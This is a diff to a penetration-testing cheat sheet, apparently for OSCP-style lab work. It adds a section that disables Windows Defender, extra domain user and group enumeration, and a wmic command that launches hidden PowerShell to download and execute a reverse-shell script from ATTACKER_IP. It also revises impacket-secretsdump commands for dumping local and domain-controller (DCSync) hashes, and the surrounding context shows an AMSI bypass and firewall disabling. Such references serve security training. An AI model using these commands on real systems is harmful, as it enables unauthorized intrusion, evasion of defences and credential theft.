@@ -71,8 +71,9 @@ Other great cheetsheets:
   - [5.4. Antivirus & Firewall Evasion](#54-antivirus--firewall-evasion)
     - [5.4.1. Windows AMSI Bypass](#541-windows-amsi-bypass)
     - [5.4.2. Turn off Windows Firewall](#542-turn-off-windows-firewall)
-    - [5.4.3. Windows LOLBAS Encoding/Decoding](#543-windows-lolbas-encodingdecoding)
-    - [5.4.4. Execute Inline Tasks with MSBuild.exe](#544-execute-inline-tasks-with-msbuildexe)
+    - [5.4.3. Turn off Windows Defender](#543-turn-off-windows-defender)
+    - [5.4.4. Windows LOLBAS Encoding/Decoding](#544-windows-lolbas-encodingdecoding)
+    - [5.4.5. Execute Inline Tasks with MSBuild.exe](#545-execute-inline-tasks-with-msbuildexe)
   - [5.5. Windows UAC Bypass](#55-windows-uac-bypass)
   - [5.6. Windows Pass-The-Hash](#56-windows-pass-the-hash)
   - [5.7. Windows Token Impersonation](#57-windows-token-impersonation)
@@ -132,7 +133,7 @@ Other great cheetsheets:
   - [10.5. Bending with netsh](#105-bending-with-netsh)
 - [11. Miscellaneous](#11-miscellaneous)
   - [11.1. Disable SSH Host Key Checking](#111-disable-ssh-host-key-checking)
-  - [Convert text to Windows UTF-16 format on Linux](#convert-text-to-windows-utf-16-format-on-linux)
+  - [11.2. Convert text to Windows UTF-16 format on Linux](#112-convert-text-to-windows-utf-16-format-on-linux)
 
 # 3. Scanning and Enumeration
 
@@ -1058,16 +1059,22 @@ systeminfo | findstr /B /C:"Domain"
 
 :: Which Domain Controller you're authenticated to (logonserver)
 set l
-nltest /dsgetdc:<domain>
+nltest /dsgetdc:DOMAIN.TLD
 
+:: View Domain Users
+net user /domain
 :: View Domain Groups
 net group /domain
 
 :: View Members of Domain Group
 net group /domain "Domain Administrators"
+net group /domain "Domain Admins"
 
 :: List saved credentials
 cmdkey /list
+:: if found, might be able to pivot with:
+:: wmic /node:VICTIM_IP process call create "cmd /c powershell -nop -noni -exec bypass -w hidden -c \"IEX((new-object net.webclient).downloadstring('http://ATTACKER_IP/rsh.ps1'))\""
+:: or steal creds with mimikatz
 
 :: Firewall
 netsh firewall show state
@@ -1201,7 +1208,13 @@ $a=[Ref].Assembly.GetTypes();foreach($b in $a){if ($b.Name -like "*iUtils") {$c=
 netsh advfirewall set allprofiles state off
 ```
 
-### 5.4.3. Windows LOLBAS Encoding/Decoding
+### 5.4.3. Turn off Windows Defender
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+### 5.4.4. Windows LOLBAS Encoding/Decoding
 
 ```bat
 :: base64 encode a file
@@ -1214,7 +1227,7 @@ certutil --decodehex encoded_hexadecimal_InputFileName
 certutil.exe -hashfile somefile.txt MD5
 ```
 
-### 5.4.4. Execute Inline Tasks with MSBuild.exe
+### 5.4.5. Execute Inline Tasks with MSBuild.exe
 
 MSBuild is built into Windows .NET framework, and it lets you execute arbitrary
 C#/.NET code inline. Modify the XML file below with your shellcode from
@@ -2197,7 +2210,7 @@ copy %WINDIR%\repair\security \\192.168.119.144\share\security-repair.save
 Then, on attack box:
 ```sh
 # using impacket secretsdump.py (security.save optional)
-impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
+impacket-secretsdump -sam sam.save -system system.save -security security.save -outputfile secretsdump LOCAL
 ```
 
 #### 7.3.5.1. Dumping Hashes from Windows Domain Controller
@@ -2206,7 +2219,7 @@ DCSync Attack
 
 ```sh
 # requires authentication
-impacket-secretsdump DOMAIN/username:Password@DC_IP_or_FQDN -just-dc-ntlm | tee dc-hashes.txt
+impacket-secretsdump -just-dc-ntlm -outputfile secretsdump DOMAIN/username:Password@DC_IP_or_FQDN
 ```
 
 ### 7.3.6. Using mimikatz to dump hashes and passwords
@@ -2374,7 +2387,7 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 ## 8.4. Connect to Windows RDP
 
 ```sh
-xfreerdp /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:VICTIM_IP
+xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:VICTIM_IP
 # to attach a drive, use:
 # /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot
 ```
@@ -2567,10 +2580,9 @@ Host *
    UserKnownHostsFile=/dev/null
 ```
 
-## Convert text to Windows UTF-16 format on Linux
+## 11.2. Convert text to Windows UTF-16 format on Linux
 
 ```sh
-echo "some text" | iconv -t UTF-16LE
-
 # useful for encoding a powershell command in base64
+echo "some text" | iconv -t UTF-16LE
 ```
